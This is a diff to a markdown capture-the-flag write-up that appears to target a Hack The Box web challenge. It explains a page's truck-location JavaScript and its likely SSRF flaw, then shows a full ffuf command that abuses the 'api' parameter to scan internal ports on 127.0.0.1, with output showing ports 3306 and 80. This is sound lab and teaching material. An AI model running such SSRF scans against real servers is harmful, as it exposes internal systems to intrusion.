@@ -20,76 +20,76 @@ We can see this js code at the end of the file, let's break it down:
 ```ad-important
 ### **1. Loop Through Truck IDs**
 
-- Iterates over a list of truck IDs:Â `["FusionExpress01", "FusionExpress02", "FusionExpress03"]`.
-    
+- Iterates over a list of truck IDs:`["FusionExpress01", "FusionExpress02", "FusionExpress03"]`.
+ 
 - For each truck ID, an HTTP request is made to fetch its location.
-    
+ 
 
 ---
 
 ### **2. XMLHttpRequest Setup**
 
-- **Synchronous Request**:  
-    `xhr.open('POST', '/', false)`Â creates aÂ **synchronous**Â POST request to the server (`/`).  
-    _(Synchronous requests block the UI until completion, which is generally discouraged.)_
-    
-- **Request Headers**:  
-    SetsÂ `Content-Type: application/x-www-form-urlencoded`Â to send data as form-encoded key-value pairs.
-    
+- **Synchronous Request**: 
+ `xhr.open('POST', '/', false)` creates a **synchronous** POST request to the server (`/`). 
+ _(Synchronous requests block the UI until completion, which is generally discouraged.)_
+ 
+- **Request Headers**: 
+ Sets`Content-Type: application/x-www-form-urlencoded` to send data as form-encoded key-value pairs.
+ 
 
 ---
 
 ### **3. Request Handling**
 
-- **POST Data**:  
-    Sends the parameterÂ `api=http://truckapi.htb/?id=<TRUCK_ID>`Â in the request body.
-    
-    - `encodeURIComponent("=" + truckID)`Â ensures theÂ `=`Â and truck ID are URL-safe (e.g.,Â `%3DFusionExpress01`).
-        
-    - Final URL sent to the server:Â `http://truckapi.htb/?id=FusionExpress01`.
-        
-- **Server-Side Behavior**:  
-    The server likely acts as a proxy, using theÂ `api`Â parameter to fetch data from the internalÂ `truckapi.htb`Â endpoint.  
-    _(This could introduce SSRF vulnerabilities if the server doesnâ€™t validate the URL.)_
-    
+- **POST Data**: 
+ Sends the parameter`api=http://truckapi.htb/?id=<TRUCK_ID>` in the request body.
+ 
+ - `encodeURIComponent("=" + truckID)` ensures the`=` and truck ID are URL-safe (e.g.,`%3DFusionExpress01`).
+ 
+ - Final URL sent to the server:`http://truckapi.htb/?id=FusionExpress01`.
+ 
+- **Server-Side Behavior**: 
+ The server likely acts as a proxy, using the`api` parameter to fetch data from the internal`truckapi.htb` endpoint. 
+ _(This could introduce SSRF vulnerabilities if the server doesnâ€™t validate the URL.)_
+ 
 
 ---
 
 ### **4. Response Handling**
 
 - **Success Case (HTTP 200)**:
-    
-    - Parses the response as JSON.
-        
-    - DisplaysÂ `data['location']`Â if available, orÂ `data['error']`Â if an error is present.
-        
-- **Failure Case**:  
-    Shows "Unable to fetch current truck location!" if the request fails (non-200 status).
-    
+ 
+ - Parses the response as JSON.
+ 
+ - Displays`data['location']` if available, or`data['error']` if an error is present.
+ 
+- **Failure Case**: 
+ Shows "Unable to fetch current truck location!" if the request fails (non-200 status).
+ 
 
 ---
 
 ### **5. UI Updates**
 
-- Updates the HTML element withÂ `id=truckID`Â (e.g.,Â `<div id="FusionExpress01">`) to show the location/error.
-    
+- Updates the HTML element with`id=truckID` (e.g.,`<div id="FusionExpress01">`) to show the location/error.
+ 
 
 ---
 
 ### **Key Observations**
 
-- **SSRF Risk**: The server trusts theÂ `api`Â parameter to make internal requests. If unvalidated, attackers could exploit this to access internal systems.
-    
+- **SSRF Risk**: The server trusts the`api` parameter to make internal requests. If unvalidated, attackers could exploit this to access internal systems.
+ 
 - **Hardcoded Truck IDs**: Limits functionality to predefined trucks (no user input).
-    
+ 
 - **Synchronous Requests**: Poor practice for user experience but intentional here for sequential processing.
 
 ### **Summary**
 
 For each Truck ID:
-  1. Send POST to server with URL: `http://truckapi.htb/?id=<TRUCK_ID>`
-  2. Server fetches data from `truckapi.htb`
-  3. Client displays location/error in the webpage
+ 1. Send POST to server with URL: `http://truckapi.htb/?id=<TRUCK_ID>`
+ 2. Server fetches data from `truckapi.htb`
+ 3. Client displays location/error in the webpage
 ```
 
 Understanding the functionality of the page, we can start burp and check the request:
@@ -120,32 +120,32 @@ We can see the following:
 ```
 ffuf -w ports.txt:FUZZ -u http://83.136.252.66:53014/ -X POST -H "Host: 83.136.252.66:53014" -H "Content-Type: application/x-www-form-urlencoded" -d "api=http://127.0.0.1:FUZZ" -fr "Error \(7\)" -ic -c -t 200
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : POST
- :: URL              : http://83.136.252.66:53014/
- :: Wordlist         : FUZZ: /home/samsepiol/ports.txt
- :: Header           : Host: 83.136.252.66:53014
- :: Header           : Content-Type: application/x-www-form-urlencoded
- :: Data             : api=http://127.0.0.1:FUZZ
+ :: Method : POST
+ :: URL : http://83.136.252.66:53014/
+ :: Wordlist : FUZZ: /home/samsepiol/ports.txt
+ :: Header : Host: 83.136.252.66:53014
+ :: Header : Content-Type: application/x-www-form-urlencoded
+ :: Data : api=http://127.0.0.1:FUZZ
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
- :: Filter           : Regexp: Error \(7\)
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter : Regexp: Error \(7\)
 ________________________________________________
 
-3306                    [Status: 200, Size: 45, Words: 7, Lines: 1, Duration: 158ms]
-80                      [Status: 200, Size: 4194, Words: 278, Lines: 126, Duration: 5317ms]
+3306 [Status: 200, Size: 45, Words: 7, Lines: 1, Duration: 158ms]
+80 [Status: 200, Size: 4194, Words: 278, Lines: 126, Duration: 5317ms]
 ```
 
 So, port 3306 is open, let's check the response:
